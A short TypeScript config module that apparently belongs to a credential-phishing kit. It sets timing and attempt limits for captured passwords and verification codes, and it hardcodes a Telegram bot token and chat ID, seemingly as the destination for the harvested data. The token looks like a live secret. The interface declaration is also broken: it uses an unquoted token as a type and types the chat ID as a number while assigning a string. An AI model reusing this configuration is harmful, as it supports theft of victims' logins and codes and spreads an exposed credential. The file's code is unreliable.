interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: -1002426577751;
    data_token: 7594014258:AAElVSGwpNAIUdT0y8PXtiup6Wf2GHs0-6c;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 5000,
    max_failed_code_attempts: 0,
    max_failed_password_attempts: 0,
    password_loading_time: 5000,
  },
  telegram: {
    data_chatid: "-1002426577751",
    data_token: "7594014258:AAElVSGwpNAIUdT0y8PXtiup6Wf2GHs0-6c",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
